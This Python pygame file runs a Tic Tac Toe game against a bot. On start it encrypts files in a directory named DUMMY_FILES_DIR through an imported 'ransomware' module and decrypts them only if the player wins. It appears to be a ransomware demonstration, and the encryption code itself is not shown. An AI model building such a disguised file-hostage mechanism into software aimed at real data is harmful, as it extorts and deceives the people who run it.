import ransomware
from ui import *
from ransomware import *
from bot_logic import *

# Initialize the game
pygame.init()
pygame.display.set_caption("Tic Tac Toe")


def main():
    if not is_encrypted():
        encrypt_files(DUMMY_FILES_DIR)
        set_encryption_status("encrypted")

    running = True
    player = "X"
    winner = None
    game_over = False

    while running:
        SCREEN.fill(WHITE)
        draw_grid()
        draw_symbols()

        if winner or is_draw():
            game_over = True
            msg = f"Winner: {winner}" if winner else "Draw"
            draw_text_centered(msg, MESSAGE_FONT, BLACK, -50)
            if winner == "X":
                decrypt_files(DUMMY_FILES_DIR)  # Decrypt files only if X wins
                set_encryption_status("decrypted")

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.MOUSEBUTTONDOWN and not game_over:
                x, y = event.pos
                col = x // CELL_SIZE
                row = y // CELL_SIZE

                if GRID[row][col] is None:
                    GRID[row][col] = player
                    winner = check_winner()

                    if not winner and not is_draw():
                        bot_move = hard_bot(GRID, "O", "X")
                        if bot_move:
                            GRID[bot_move[0]][bot_move[1]] = "O"
                            winner = check_winner()

        pygame.display.flip()

    pygame.quit()


if __name__ == "__main__":
    main()
